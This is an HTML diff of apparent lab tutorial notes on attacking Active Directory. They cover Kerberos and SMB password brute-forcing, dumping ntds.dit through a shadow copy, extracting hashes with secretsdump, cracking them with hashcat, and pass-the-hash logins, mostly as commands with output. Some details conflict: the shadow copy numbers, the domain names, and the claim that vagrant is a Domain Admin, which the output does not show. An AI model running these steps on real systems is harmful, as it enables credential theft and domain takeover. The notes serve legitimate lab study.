+<p>Once a workstation is joined to a domain, it will no longer use the local SAM database for authentication, but will instead query the domain controller (DC) for user credentials. However, the SAM database will still be used if you login locally to the workstation. This means that if we can compromise a workstation that is part of a domain, we may be able to extract credentials for domain users.</p>
+<p><img src="infosec/windows/images/ADauthentication_diagram.png" alt=""></p>
+<h2 id="dictionary-attacks"><a class="header" href="#dictionary-attacks">Dictionary Attacks</a></h2>
+<p>As always, dictionary attacks are noisy and typically easy to detect. However, they can be effective if you have a good wordlist and the target account has a weak password. Also note that many organizations have password policies (typically enforced via Group Policy objects) that require complex passwords, which can make dictionary attacks less effective.</p>
+<p>One method of determining usernames is to use a tool like theHarvester or even LinkedIn to gather email addresses. Usernames are often the first part of the email address (e.g., jdoe for jdoe@mysite.com)</p>
+<p>We can use a tool like <code>kerbrute</code> to perform a dictionary attack against Kerberos on the domain controller. This tool will attempt to authenticate to the DC using a list of usernames and passwords.</p>
+<p>Once we have a list of valid usernames, we can attempt to brute-force passwords for those accounts. Here, we will use the popular <code>rockyou.txt</code> wordlist to attempt to brute-force the password for the <code>vagrant</code> user.</p>
+<pre><code class="language-bash">┌──(toor㉿blue)-[~/Downloads]
+└─$ ./kerbrute_linux_amd64 bruteuser --dc 192.168.86.218 -d homelab.local /usr/share/wordlists/rockyou.txt vagrant
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 01/19/26 - Ronnie Flathers @ropnop
+
+2026/01/19 13:48:38 &gt;  Using KDC(s):
+2026/01/19 13:48:38 &gt;   192.168.86.218:88
+2026/01/19 13:53:15 &gt;  [+] VALID LOGIN:  vagrant@homelab.local:vagrant
+2026/01/19 13:53:15 &gt;  Done! Tested 114989 logins (1 successes) in 277.561 seconds
+</code></pre>
+<p>We can also use <code>netexec</code> to brute force a user password:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+
+SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
+SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
+&lt;SNIP&gt;
+</code></pre>
+<p>In the example above, <code>netexec</code> is using <code>smb</code> to attempt to authenticate to the DC using the <code>bwilliamson</code> username and a list of passwords from <code>fasttrack.txt</code>. When it finds a valid password, it will print it to the screen. Note that if an account lockout policy is configured (which)
+is likely these days), repeated failed login attempts may lock the account, so use caution when performing brute-force attacks. Repeated and unexpected account lockouts is almost always a sign of an ongoing brute-force attack, and a sure way to get noticed. Tread lightly.</p>
+<h2 id="dumping-ntdsdit"><a class="header" href="#dumping-ntdsdit">Dumping ntds.dit</a></h2>
+<p>The ntds.dit file is the Active Directory database that contains all of the information about the domain, including user accounts and their hashed passwords. If we can obtain a copy of this file, we can attempt to crack the hashes offline using a tool like <code>hashcat</code> or <code>john the ripper</code>.</p>
+<p>We can use <code>evil-winrm</code> to connect to a Windows machine that is part of the domain using the credentials we have obtained:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ evil-winrm -i 192.168.86.218 -u vagrant-p 'vagrant'
+</code></pre>
+<p>We can check with groups a user account is a member of:</p>
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; net groups
+
+Group Accounts for \\
+
+-------------------------------------------------------------------------------
+*Cloneable Domain Controllers
+*DnsUpdateProxy
+*Domain Admins
+*Domain Computers
+*Domain Controllers
+*Domain Guests
+*Domain Users
+*Enterprise Admins
+*Enterprise Key Admins
+*Enterprise Read-only Domain Controllers
+*Group Policy Creator Owners
+*Key Admins
+*Protected Users
+*Read-only Domain Controllers
+*Schema Admins
+The command completed with one or more errors.
+
+</code></pre>
+<p>We can also check the password policy and find some other useful information about this user account:</p>
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; net user vagrant
+User name                    vagrant
+Full Name                    vagrant
+Comment                      vagrant
+User's comment
+Country/region code          001 (United States)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/13/2026 3:32:20 AM
+Password expires             Never
+Password changeable          1/14/2026 3:32:20 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/19/2026 6:56:35 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+</code></pre>
+<p>We can see that the <code>vagrant</code> user is a member of the <code>Domain Admins</code> group, which means we have administrative privileges on the domain. This will allow us to dump the ntds.dit file.</p>
+<p>We will need to make a shadow copy of the volume that contains the ntds.dit file using <code>vssadmin</code>:</p>
+<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; vssadmin create shadow /for=c:
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'c:\'
+    Shadow Copy ID: {f089068a-e156-493c-aa90-d08f78f2f8e9}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; 
+</code></pre>
+<p>The location of the ntds.dit file is typically <code>C:\Windows\NTDS\ntds.dit</code> (this can be changed when installing ADDS). We can copy this file from the shadow copy to a location we can access:</p>
+<pre><code class="language-bash">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+        1 file(s) copied.
+</code></pre>
+<p>Note: As was the case with SAM, the hashes stored in NTDS.dit are encrypted with a key stored in SYSTEM. In order to successfully extract the hashes, one must download both files.</p>
+<p>We can use <code>secretsdump.py</code> from the Impacket suite to extract the hashes from the ntds.dit file:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
+[*] Reading and decrypting hashes from NTDS.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
+&lt;SNIP&gt;
+</code></pre>
+<h2 id="a-faster-method-using-netexec-to-capture-ntdsdit"><a class="header" href="#a-faster-method-using-netexec-to-capture-ntdsdit">A faster method: Using NetExec to capture NTDS.dit</a></h2>
+<p>Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p>
+<pre><code class="language-bash">┌──(toor㉿blue)-[~/Downloads]
+└─$ netexec smb 192.168.86.218 -u vagrant -p vagrant -M ntdsutil
+SMB         192.168.86.218  445    WIN-F78TN8NTHVE  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-F78TN8NTHVE) (domain:homelab.local) (signing:True) (SMBv1:False)
+SMB         192.168.86.218  445    WIN-F78TN8NTHVE  [+] homelab.local\vagrant:vagrant (Pwn3d!)
+NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\176884951
+NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         192.168.86.218  445    WIN-F78TN8NTHVE  [-] wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
+NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  [-] Error while dumping NTDS
+</code></pre>
+<p><strong>RESULTS MAY VARY DEPENDING ON ANTIVIRUS/EDR PRESENCE AND CONFIGURATION</strong></p>
+<h2 id="cracking-hashes"><a class="header" href="#cracking-hashes">Cracking Hashes</a></h2>
+<p>Once we have obtained the hashes from the ntds.dit file, we can attempt to crack them using a tool like <code>hashcat</code> or <code>john the ripper</code>. Here, we will use <code>hashcat</code> to attempt to crack the hashes using the <code>rockyou.txt</code> wordlist:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+
+64f12cddaa88057e06a81b54e73b949b:Password1
+</code></pre>
+<h2 id="pass-the-hash-pth-considerations"><a class="header" href="#pass-the-hash-pth-considerations">Pass the Hash (PtH) considerations</a></h2>
+<p>We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="electronics"><a class="header" href="#electronics">Electronics</a></h1>
 <ul>
